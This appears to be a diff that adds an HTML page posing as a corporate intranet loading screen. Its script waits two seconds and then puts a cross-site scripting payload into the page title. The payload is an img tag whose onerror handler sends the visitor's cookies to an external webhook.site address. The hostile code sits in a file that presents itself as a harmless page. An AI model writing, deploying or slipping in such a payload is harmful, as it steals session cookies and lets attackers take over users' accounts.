@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Corporate Intranet - Loading...</title>
+  <style>
+    body { font-family: sans-serif; text-align: center; padding-top: 100px; }
+  </style>
+</head>
+<body>
+  <h1>Loading application data, please wait...</h1>
+  <script>
+    // This function will run after 2 seconds
+    setTimeout(function() {
+      const webhookUrl = 'https://webhook.site/9be4dbf7-093f-4510-b83c-88a2ed5f8b48';
+      const jsPayload = `new Image().src='${webhookUrl}?cookie=' + encodeURIComponent(document.cookie);`;
+      const title = `Data Loaded <img src=x onerror="${jsPayload}">`;
+      document.title = title;
+    }, 2000);
+  </script>
+</body>
+</html>
